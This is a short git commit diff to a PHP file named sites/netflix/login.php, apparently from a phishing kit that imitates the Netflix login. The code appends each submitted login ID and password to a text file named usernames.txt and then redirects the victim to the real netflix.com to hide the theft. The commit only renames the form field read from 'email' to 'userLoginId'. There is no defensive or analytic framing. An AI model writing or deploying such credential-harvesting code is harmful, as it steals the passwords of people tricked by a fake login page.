c4b3925aade2628f2f02af933d9574e91b1cf16a
The Burning <62335141+Git-Ankitraj@users.noreply.github.com>
2021-04-09 20:55:49 +0530

    Upgraded

--- sites/netflix/login.php
+++ sites/netflix/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['userLoginId'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://netflix.com');
 exit();
